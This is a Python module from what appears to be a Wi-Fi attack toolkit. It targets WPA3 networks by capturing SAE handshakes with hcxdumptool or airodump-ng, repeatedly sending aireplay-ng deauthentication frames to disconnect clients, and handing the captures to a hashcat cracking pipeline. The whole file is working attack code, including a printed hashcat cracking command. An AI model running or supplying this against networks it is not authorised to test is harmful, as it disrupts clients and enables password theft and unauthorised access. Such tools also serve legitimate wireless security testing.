"""
attacks/wpa3.py - WPA3 SAE (Dragonfly) handshake capture
WPA3 is significantly harder to crack than WPA2.
This captures the SAE handshake for offline cracking attempts.
Note: WPA3 has strong offline attack resistance by design.
"""

import subprocess
import time
import os
from utils.logger import Logger
from utils.tools import check_tool

log = Logger()


class WPA3Attack:
    def __init__(self, interface, target, wordlist=None,
                 output_dir="./captures", deauth_count=5):
        self.interface = interface
        self.target = target
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.deauth_count = deauth_count
        self.timeout = 90
        self._capfile = None

    def run(self):
        """Capture WPA3 SAE handshake"""
        bssid = self.target["bssid"]
        channel = self.target["channel"]
        essid = self.target["essid"]

        log.warn("WPA3 uses SAE (Simultaneous Authentication of Equals)")
        log.warn("SAE is resistant to offline dictionary attacks by design")
        log.info("Attempting SAE handshake capture anyway...")

        # Set channel
        subprocess.run(
            ["iw", "dev", self.interface, "set", "channel", str(channel)],
            capture_output=True
        )

        capfile_base = os.path.join(
            self.output_dir,
            f"wpa3_{essid.replace(' ', '_')}_{bssid.replace(':', '')}"
        )
        self._capfile = capfile_base + "-01.cap"

        # hcxdumptool is better for WPA3
        if check_tool("hcxdumptool"):
            return self._capture_with_hcxdumptool(bssid, channel, essid)
        else:
            return self._capture_with_airodump(bssid, channel, capfile_base)

    def _capture_with_hcxdumptool(self, bssid, channel, essid):
        """Use hcxdumptool for WPA3 capture (better WPA3 support)"""
        bssid_clean = bssid.replace(":", "").lower()
        filter_file = os.path.join(self.output_dir, "wpa3_filter.txt")
        pcapng = os.path.join(
            self.output_dir,
            f"wpa3_{essid.replace(' ', '_')}_{bssid_clean}.pcapng"
        )

        with open(filter_file, "w") as f:
            f.write(bssid_clean + "\n")

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", pcapng,
            "--filterlist_ap=" + filter_file,
            "--filtermode=2",
            "--enable_status=1",
        ]

        if str(channel).isdigit():
            cmd += ["-c", str(channel)]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            start = time.time()
            captured = False

            while time.time() - start < self.timeout:
                elapsed = int(time.time() - start)

                if os.path.exists(pcapng) and os.path.getsize(pcapng) > 300:
                    captured = True
                    break

                print(f"\r[*] Waiting for SAE handshake... {elapsed}s / {self.timeout}s", end="", flush=True)
                time.sleep(1)

            print()
            proc.terminate()
            proc.wait()

            if captured:
                log.success(f"WPA3 capture: {pcapng}")
                log.warn("WPA3 cracking is computationally expensive.")
                log.info(f"Manual crack: hashcat -m 22000 {pcapng} <wordlist>")
                return {"captured": True, "capfile": pcapng}

        except Exception as e:
            log.error(f"hcxdumptool failed: {e}")

        return {"captured": False}

    def _capture_with_airodump(self, bssid, channel, capfile_base):
        """Fallback airodump capture for WPA3"""
        cap_cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", capfile_base,
            "--output-format", "cap",
            self.interface
        ]

        proc = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        start = time.time()
        while time.time() - start < self.timeout:
            elapsed = int(time.time() - start)
            print(f"\r[*] Capturing WPA3... {elapsed}s / {self.timeout}s", end="", flush=True)

            # Periodic deauth to force reconnect
            if elapsed % 15 == 0:
                self._deauth(bssid)

            time.sleep(1)

        print()
        proc.terminate()
        proc.wait()

        capfile = capfile_base + "-01.cap"
        if os.path.exists(capfile) and os.path.getsize(capfile) > 100:
            return {"captured": True, "capfile": capfile}

        return {"captured": False}

    def _deauth(self, bssid):
        """Send deauth to force client reconnect"""
        if not check_tool("aireplay-ng"):
            return
        subprocess.Popen(
            ["aireplay-ng", "--deauth", str(self.deauth_count), "-a", bssid, self.interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    def crack(self, capfile):
        """WPA3 cracking — delegates to CrackOrchestrator.

        WPA3 SAE has strong offline attack resistance by design,
        but weak passwords can still be found. The CrackOrchestrator
        handles hashcat with GPU, escalating phases, and fallback.
        """
        from cracking.crack_orchestrator import CrackOrchestrator, CrackConfig

        log.warn("WPA3 offline cracking has very low success rate (SAE resistance)")
        log.info("Running anyway through hashcat cracking pipeline...")

        config = CrackConfig(
            wordlist=self.wordlist,
            bssid=self.target["bssid"],
        )
        orchestrator = CrackOrchestrator(config)
        return orchestrator.crack(capfile)

